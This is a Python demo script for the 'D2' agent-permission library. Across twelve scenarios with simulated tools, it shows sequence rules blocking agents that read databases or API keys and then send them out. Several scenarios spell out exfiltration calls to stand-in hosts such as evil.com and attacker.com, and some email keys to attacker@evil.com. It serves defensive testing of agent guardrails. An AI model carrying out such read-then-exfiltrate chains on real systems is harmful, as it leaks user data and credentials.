# Copyright (c) 2025 Artoo Corporation
# Licensed under the Business Source License 1.1 (see LICENSE).
# Change Date: 2029-09-08  •  Change License: LGPL-3.0-or-later

"""Sequence enforcement demo - preventing confused deputy attacks.

This demo shows how D2's sequence enforcement prevents data exfiltration
patterns in agentic systems, as identified by Trail of Bits research on
multi-agent system hijacking.

Run with:
    python examples/sequence_demo.py
"""

from __future__ import annotations

import os
from pathlib import Path

import asyncio

from d2 import configure_rbac, d2_guard, set_user, clear_user_context
from d2.exceptions import PermissionDeniedError


# Set policy file path
EXAMPLES_DIR = Path(__file__).resolve().parent
POLICY_PATH = EXAMPLES_DIR / "sequence_demo_policy.yaml"
os.environ["D2_POLICY_FILE"] = str(POLICY_PATH)


# =============================================================================
# Guarded functions (simulate agent capabilities)
# =============================================================================

@d2_guard("database.read_users")
async def read_users():
    """Simulate reading user data from database."""
    print("  [DB] Reading users...")
    return {
        "users": [
            {"id": 1, "name": "Alice", "email": "alice@example.com"},
            {"id": 2, "name": "Bob", "email": "bob@example.com"},
        ]
    }


@d2_guard("database.read_payments")
async def read_payments():
    """Simulate reading payment data from database."""
    print("  [DB] Reading payments...")
    return {
        "payments": [
            {"user_id": 1, "amount": 99.99, "card_last4": "1234"},
            {"user_id": 2, "amount": 149.99, "card_last4": "5678"},
        ]
    }


@d2_guard("secrets.get_api_key")
async def get_api_key():
    """Simulate retrieving API key."""
    print("  [SECRETS] Getting API key...")
    return {"api_key": "sk_live_abc123xyz"}


@d2_guard("web.http_request")
async def http_request(url: str, data: dict):
    """Simulate sending HTTP request to external service."""
    print(f"  [WEB] Sending request to {url}...")
    print(f"  [WEB] Payload: {data}")
    return {"status": "sent", "status_code": 200}


@d2_guard("analytics.summarize")
async def summarize(data: dict):
    """Simulate analytics processing."""
    print("  [ANALYTICS] Summarizing data...")
    return {"summary": f"Processed {len(data)} items"}


@d2_guard("file.write")
async def write_file(path: str, data: dict):
    """Simulate writing data to local filesystem."""
    print(f"  [FILE] Writing to {path}...")
    return {"status": "written", "path": path}


@d2_guard("file.read")
async def read_file(path: str):
    """Simulate reading from local filesystem."""
    print(f"  [FILE] Reading {path}...")
    return {"content": "file_content_here", "path": path}


@d2_guard("email.send")
async def send_email(to: str, subject: str, body: str):
    """Simulate sending email."""
    print(f"  [EMAIL] Sending email to {to}...")
    print(f"  [EMAIL] Subject: {subject}")
    return {"status": "sent", "to": to}


@d2_guard("s3.upload")
async def upload_to_s3(bucket: str, key: str, data: dict):
    """Simulate uploading to S3."""
    print(f"  [S3] Uploading to s3://{bucket}/{key}...")
    return {"status": "uploaded", "url": f"s3://{bucket}/{key}"}


# =============================================================================
# Demo scenarios
# =============================================================================

async def demo_direct_exfiltration():
    """Scenario 1: Direct data exfiltration (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 1: Direct Data Exfiltration Attack")
    print("=" * 70)
    print("\nAttack: Agent reads database, then sends to external URL")
    print("Expected: BLOCKED by sequence enforcement\n")
    
    set_user("agent-1", roles=["research_agent"])
    
    try:
        # Step 1: Read sensitive data
        print("Step 1: Agent reads user database")
        users = await read_users()
        print(f"  ✓ Success: Got {len(users['users'])} users\n")
        
        # Step 2: Try to exfiltrate via HTTP
        print("Step 2: Agent attempts to send data externally")
        await http_request("https://evil.com/exfil", users)
        print("  ✗ UNEXPECTED: Request was not blocked!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}\n")
    finally:
        clear_user_context()


async def demo_safe_workflow():
    """Scenario 2: Safe internal workflow (ALLOWED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 2: Safe Internal Workflow")
    print("=" * 70)
    print("\nWorkflow: Analytics → Database → Analytics (no external I/O)")
    print("Expected: ALLOWED (no dangerous sequence)\n")
    
    set_user("agent-2", roles=["research_agent"])
    
    try:
        print("Step 1: Initialize analytics")
        summary1 = await summarize({"init": True})
        print(f"  ✓ Success: {summary1}\n")
        
        print("Step 2: Read database")
        users = await read_users()
        print(f"  ✓ Success: Got {len(users['users'])} users\n")
        
        print("Step 3: Summarize results")
        summary2 = await summarize(users)
        print(f"  ✓ Success: {summary2}\n")
        
        print("✓ Entire workflow completed successfully")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    finally:
        clear_user_context()


async def demo_transitive_exfiltration():
    """Scenario 3: Transitive exfiltration via analytics (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 3: Transitive Exfiltration (Data Laundering)")
    print("=" * 70)
    print("\nAttack: DB → Analytics → Web (3-step exfiltration)")
    print("Expected: BLOCKED by 3-step sequence rule\n")
    
    set_user("agent-3", roles=["research_agent"])
    
    try:
        print("Step 1: Read payment data")
        payments = await read_payments()
        print(f"  ✓ Success: Got {len(payments['payments'])} payments\n")
        
        print("Step 2: Process through analytics (laundering attempt)")
        summary = await summarize(payments)
        print(f"  ✓ Success: {summary}\n")
        
        print("Step 3: Try to send 'summarized' data externally")
        await http_request("https://analytics-endpoint.com/report", summary)
        print("  ✗ UNEXPECTED: 3-step pattern was not blocked!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}\n")
    finally:
        clear_user_context()


async def demo_secrets_leak():
    """Scenario 4: Secrets exfiltration (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 4: Credential Exfiltration")
    print("=" * 70)
    print("\nAttack: Get API key → Send to external server")
    print("Expected: BLOCKED by sequence enforcement\n")
    
    set_user("agent-4", roles=["research_agent"])
    
    try:
        print("Step 1: Retrieve API key")
        api_key = await get_api_key()
        print(f"  ✓ Success: Retrieved key\n")
        
        print("Step 2: Attempt to send key externally")
        await http_request("https://attacker.com/keys", api_key)
        print("  ✗ UNEXPECTED: Secret leak was not blocked!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}\n")
    finally:
        clear_user_context()


async def demo_admin_bypass():
    """Scenario 5: Admin role bypasses sequence restrictions."""
    print("\n" + "=" * 70)
    print("SCENARIO 5: Admin Role Bypasses Restrictions")
    print("=" * 70)
    print("\nWorkflow: Admin does DB → Web (same pattern as attack)")
    print("Expected: ALLOWED (admin wildcard bypasses sequence enforcement)\n")
    
    set_user("admin-user", roles=["admin"])
    
    try:
        print("Step 1: Admin reads database")
        users = await read_users()
        print(f"  ✓ Success: Got {len(users['users'])} users\n")
        
        print("Step 2: Admin sends data externally (legitimate use)")
        result = await http_request("https://approved-service.com/sync", users)
        print(f"  ✓ Success: {result}\n")
        
        print("✓ Admin workflow completed (no sequence restrictions)")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    finally:
        clear_user_context()


async def demo_filesystem_exfiltration():
    """Scenario 6: Local filesystem exfiltration (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 6: Filesystem Exfiltration Attack")
    print("=" * 70)
    print("\nAttack: DB → File Write (local data exfiltration)")
    print("Expected: BLOCKED by sequence enforcement\n")
    
    set_user("data-eng-1", roles=["data_engineer"])
    
    try:
        print("Step 1: Data engineer reads user data")
        users = await read_users()
        print(f"  ✓ Success: Got {len(users['users'])} users\n")
        
        print("Step 2: Attempt to write to local file (exfiltration)")
        await write_file("/tmp/stolen_users.json", users)
        print("  ✗ UNEXPECTED: File write was not blocked!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}\n")
    finally:
        clear_user_context()


async def demo_email_exfiltration():
    """Scenario 7: Email-based exfiltration (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 7: Email Exfiltration Attack")
    print("=" * 70)
    print("\nAttack: Secrets → Email (credential theft via email)")
    print("Expected: BLOCKED by sequence enforcement\n")
    
    set_user("agent-5", roles=["research_agent"])
    
    try:
        print("Step 1: Retrieve API credentials")
        api_key = await get_api_key()
        print(f"  ✓ Success: Retrieved credentials\n")
        
        print("Step 2: Attempt to email credentials")
        await send_email(
            to="attacker@evil.com",
            subject="API Keys",
            body=str(api_key)
        )
        print("  ✗ UNEXPECTED: Email was not blocked!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}\n")
    finally:
        clear_user_context()


async def demo_allowed_reverse_sequence():
    """Scenario 8: Allowed reverse sequence (Web → DB is safe)."""
    print("\n" + "=" * 70)
    print("SCENARIO 8: Allowed Reverse Sequence")
    print("=" * 70)
    print("\nWorkflow: Web → DB (fetching external data, then storing)")
    print("Expected: ALLOWED (sequence rules are directional)\n")
    
    set_user("agent-6", roles=["research_agent"])
    
    try:
        print("Step 1: Make external API call (fetch data)")
        result = await http_request("https://api.example.com/data", {})
        print(f"  ✓ Success: {result}\n")
        
        print("Step 2: Store results in database")
        users = await read_users()
        print(f"  ✓ Success: Got {len(users['users'])} users\n")
        
        print("✓ Reverse sequence allowed (external → internal is safe)")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    finally:
        clear_user_context()


async def demo_complex_multi_hop():
    """Scenario 9: Complex 4-step laundering attempt (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 9: Complex Multi-Hop Laundering")
    print("=" * 70)
    print("\nAttack: Secrets → Analytics → File → Email (4-step chain)")
    print("Expected: BLOCKED at multiple points\n")
    
    set_user("agent-7", roles=["research_agent"])
    
    try:
        print("Step 1: Get API key")
        api_key = await get_api_key()
        print(f"  ✓ Success: Retrieved key\n")
        
        print("Step 2: Process through analytics (laundering)")
        summary = await summarize(api_key)
        print(f"  ✓ Success: {summary}\n")
        
        print("Step 3: Try to send via web (will be blocked here)")
        await http_request("https://analytics.com/report", summary)
        print("  ✗ UNEXPECTED: Not blocked at step 3!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}")
        print("  Note: 3-step sequence rule caught this (secrets → analytics → web)\n")
    finally:
        clear_user_context()


async def demo_multi_agent_isolation():
    """Scenario 10: Multiple agents have isolated call histories."""
    print("\n" + "=" * 70)
    print("SCENARIO 10: Multi-Agent Call History Isolation")
    print("=" * 70)
    print("\nWorkflow: Agent A reads DB, Agent B makes web request")
    print("Expected: ALLOWED (different agents = different histories)\n")
    
    # Agent A: Read database
    print("Agent A:")
    set_user("agent-a", roles=["research_agent"])
    try:
        print("  Step 1: Agent A reads database")
        users = await read_users()
        print(f"    ✓ Success: Got {len(users['users'])} users\n")
    finally:
        clear_user_context()
    
    # Agent B: Make web request (different context, clean history)
    print("Agent B:")
    set_user("agent-b", roles=["research_agent"])
    try:
        print("  Step 1: Agent B makes web request (independent history)")
        result = await http_request("https://api.example.com/ping", {})
        print(f"    ✓ Success: {result}\n")
        
        print("✓ Both agents succeeded (histories are isolated)")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    finally:
        clear_user_context()


async def demo_file_to_external():
    """Scenario 11: File read → External API (BLOCKED)."""
    print("\n" + "=" * 70)
    print("SCENARIO 11: File-to-External Exfiltration")
    print("=" * 70)
    print("\nAttack: Read File → API Call (code/config exfiltration)")
    print("Expected: BLOCKED by sequence enforcement\n")
    
    set_user("integration-1", roles=["integration_service"])
    
    try:
        print("Step 1: Read configuration file")
        config = await read_file("/etc/app/config.json")
        print(f"  ✓ Success: Read {config['path']}\n")
        
        print("Step 2: Attempt to send to external API")
        await http_request("https://attacker.com/configs", config)
        print("  ✗ UNEXPECTED: File exfiltration was not blocked!")
        
    except PermissionDeniedError as e:
        print("  ✓ BLOCKED by sequence enforcement")
        print(f"  Reason: {e.reason}\n")
    finally:
        clear_user_context()


async def demo_tool_groups_efficiency():
    """Scenario 12: Demonstrate tool groups and lazy expansion benefits."""
    print("\n" + "=" * 70)
    print("SCENARIO 12: Tool Groups & Lazy Expansion")
    print("=" * 70)
    print("\nThis policy demonstrates D2's memory-efficient approach to sequence rules.")
    print("\nProblem: Without tool groups, complex policies require many explicit rules:")
    print("  • 5 sensitive tools × 5 external tools = 25 rules for 2-hop patterns")
    print("  • 5 sensitive × 3 processing × 5 external = 75 rules for 3-hop patterns")
    print("  • With 50 tools per group: 50×50×50 = 125,000 rules in memory!")
    
    print("\nSolution: Tool groups with lazy expansion")
    print("  • Define groups in metadata:")
    print("      sensitive_data: [database.read_users, secrets.get_api_key, ...]")
    print("      external_io: [web.http_request, email.send, ...]")
    print("  • Write one rule:")
    print("      deny: ['@sensitive_data', '@external_io']")
    print("  • D2 keeps @group references intact in memory")
    print("  • At runtime: O(1) set membership check per tool call")
    
    print("\nMemory benefits:")
    print("  Without groups: 25 explicit rules → 25 pattern objects in memory")
    print("  With groups:     1 abstract rule → 1 pattern object + 2 sets")
    print("  Scales to 50×50×50 without memory explosion!")
    
    print("\nLet's verify the policy is using tool groups:")
    
    # The policy file has these group-based rules
    print("\n  Policy rules:")
    print("    1. deny: ['@sensitive_data', '@external_io']")
    print("       → Blocks ALL combinations (5×5=25 patterns)")
    print("    2. deny: ['@sensitive_data', '@internal_processing', '@external_io']")
    print("       → Blocks ALL 3-hop combinations (5×3×5=75 patterns)")
    print("    3. deny: ['database.read_payments', 'analytics.summarize']")
    print("       → Can mix explicit tools with groups!")
    
    print("\nVerifying enforcement works with @group references:")
    
    set_user("research-1", roles=["research_agent"])
    
    try:
        # Test that @sensitive_data → @external_io blocks work
        print("\nTest 1: database.read_users → web.http_request")
        print("  (both tools are in their respective groups)")
        users = await read_users()
        print(f"  ✓ Step 1 allowed: {list(users.keys())}")
        
        try:
            await http_request("https://example.com", users)
            print("  ✗ Test FAILED: Should have been blocked by @group rule")
        except PermissionDeniedError as e:
            print("  ✓ Step 2 BLOCKED by tool group sequence rule")
            print(f"  ✓ Reason: {e.reason}")
        
        # Clear history for next test
        clear_user_context()
        set_user("research-2", roles=["research_agent"])
        
        print("\nTest 2: secrets.get_api_key → email.send")
        print("  (different tools, same groups)")
        secret = await get_api_key()
        print(f"  ✓ Step 1 allowed: {list(secret.keys())}")
        
        try:
            await send_email("attacker@evil.com", "Leaked", str(secret))
            print("  ✗ Test FAILED: Should have been blocked by @group rule")
        except PermissionDeniedError as e:
            print("  ✓ Step 2 BLOCKED by same tool group rule")
            print(f"  ✓ Reason: {e.reason}")
            print("  ✓ One rule protected 5×5=25 tool combinations!")
        
    finally:
        clear_user_context()
    
    print("\nKey takeaways:")
    print("  ✓ Tool groups make policies maintainable")
    print("  ✓ Lazy expansion prevents memory explosion")
    print("  ✓ Runtime performance: O(1) set membership checks")
    print("  ✓ Can mix @group references with explicit tool IDs")
    print("  ✓ Scales to hundreds of tools without memory issues")
    
    print("\nBest practices:")
    print("  • Group semantically related tools (sensitive_data, external_io, etc.)")
    print("  • Use @group for broad categories, explicit IDs for specific exceptions")
    print("  • Update groups in one place, rules automatically apply")
    print("  • Test groups work with 'd2 diagnose' before deploying")


# =============================================================================
# Main
# =============================================================================

async def main():
    """Run all demo scenarios."""
    
    print("\n" + "=" * 70)
    print("D2 SEQUENCE ENFORCEMENT DEMO")
    print("Preventing Confused Deputy Attacks in Multi-Agent Systems")
    print("=" * 70)
    print(f"\nPolicy: {POLICY_PATH}")
    print("Research: Trail of Bits - Multi-Agent System Hijacking")
    print("https://blog.trailofbits.com/2025/07/31/hijacking-multi-agent-systems-in-your-pajamas/")
    print("\n12 scenarios demonstrating sequence enforcement + tool groups")
    
    # Initialize D2
    await configure_rbac()
    
    # Part 1: Establish baseline - show what's allowed
    print("\n" + "─" * 70)
    print("PART 1: BASELINE - Understanding Safe Workflows")
    print("─" * 70)
    
    await demo_safe_workflow()
    input("\nPress Enter to continue...\n")
    
    await demo_allowed_reverse_sequence()
    input("\nPress Enter to continue...\n")
    
    # Part 2: Basic attacks
    print("\n" + "─" * 70)
    print("PART 2: BASIC EXFILTRATION ATTACKS (2-hop)")
    print("─" * 70)
    
    await demo_direct_exfiltration()
    input("\nPress Enter to continue...\n")
    
    await demo_secrets_leak()
    input("\nPress Enter to continue...\n")
    
    await demo_filesystem_exfiltration()
    input("\nPress Enter to continue...\n")
    
    # Part 3: Advanced attacks
    print("\n" + "─" * 70)
    print("PART 3: ADVANCED ATTACKS - Multi-hop & Multi-channel")
    print("─" * 70)
    
    await demo_transitive_exfiltration()
    input("\nPress Enter to continue...\n")
    
    await demo_complex_multi_hop()
    input("\nPress Enter to continue...\n")
    
    await demo_email_exfiltration()
    input("\nPress Enter to continue...\n")
    
    await demo_file_to_external()
    input("\nPress Enter to continue...\n")
    
    # Part 4: Edge cases and administration
    print("\n" + "─" * 70)
    print("PART 4: EDGE CASES & ADMINISTRATION")
    print("─" * 70)
    
    await demo_multi_agent_isolation()
    input("\nPress Enter to continue...\n")
    
    await demo_admin_bypass()
    
    # Part 5: Tool Groups and Lazy Expansion
    print("\n" + "─" * 70)
    print("PART 5: TOOL GROUPS & MEMORY EFFICIENCY")
    print("─" * 70)
    
    await demo_tool_groups_efficiency()
    
    # Summary
    print("\n" + "=" * 70)
    print("DEMO COMPLETE - 12 SCENARIOS")
    print("=" * 70)
    print("\n📊 PROGRESSION:")
    print("  Part 1: Baseline (2 scenarios)")
    print("    → Established what's allowed: safe workflows & reverse sequences")
    print("  Part 2: Basic Attacks (3 scenarios)")
    print("    → Showed 2-hop exfiltration: DB→Web, Secrets→Web, DB→File")
    print("  Part 3: Advanced Attacks (4 scenarios)")
    print("    → Demonstrated multi-hop laundering & multi-channel attacks")
    print("  Part 4: Edge Cases (2 scenarios)")
    print("    → Explored agent isolation & admin bypass")
    print("  Part 5: Tool Groups (1 scenario)")
    print("    → Demonstrated lazy expansion for memory efficiency")
    
    print("\n🔐 KEY TAKEAWAYS:")
    print("  ✓ Direction matters: Web→DB allowed, DB→Web blocked")
    print("  ✓ Multi-hop protection: Catches 3+ step laundering attempts")
    print("  ✓ Multi-channel coverage: Web, Email, Files, S3, etc.")
    print("  ✓ Agent isolation: Each request has independent call history")
    print("  ✓ Safe workflows: Internal processing remains functional")
    print("  ✓ Admin flexibility: Wildcard bypass for legitimate operations")
    print("  ✓ Tool groups: One rule protects 25+ combinations (memory efficient)")
    
    print("\n🎯 PREVENTS:")
    print("  • Direct exfiltration (sensitive → external)")
    print("  • Transitive attacks (sensitive → processing → external)")
    print("  • Local exfiltration (sensitive → filesystem)")
    print("  • Credential theft (secrets → any external channel)")
    
    print("\n📈 SCALABILITY:")
    print("  • Without groups: 125,000 rules for 50×50×50 patterns")
    print("  • With groups: 1 rule handles same coverage")
    print("  • Runtime: O(1) set membership checks")
    print("  • Memory: Constant regardless of group size")
    
    print("\n📚 NEXT STEPS:")
    print("  → Run defense_in_depth_demo.py to see sequence + guardrails")
    print("  → See how RBAC + Sequence + I/O validation work together")
    print("  → Run policy_validation_demo.py to see strict policy validation")


if __name__ == "__main__":
    asyncio.run(main())

